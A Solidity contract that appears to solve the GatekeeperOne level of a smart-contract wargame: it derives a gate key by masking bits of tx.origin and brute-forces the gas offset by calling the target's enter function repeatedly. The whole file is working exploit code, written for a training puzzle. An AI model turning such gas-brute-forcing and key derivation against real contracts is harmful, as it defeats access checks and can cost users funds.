// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    function attack(address gatekeeperOneAddress) public {
	// ((1 << 64) - 1) - ((1 << 32) - (1 << 16))
	bytes8 limiter = 0xffffffff0000ffff;
	// hiding 16 - 31 bits from uint64 tx.origin, showing only 0 - 15, 32 - 63 bits
	bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & limiter;
	for (uint256 i; i < 300; i++) {
	    (bool success, ) = gatekeeperOneAddress.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
	    if (success) {
		break;
	    }
	}
    }
}
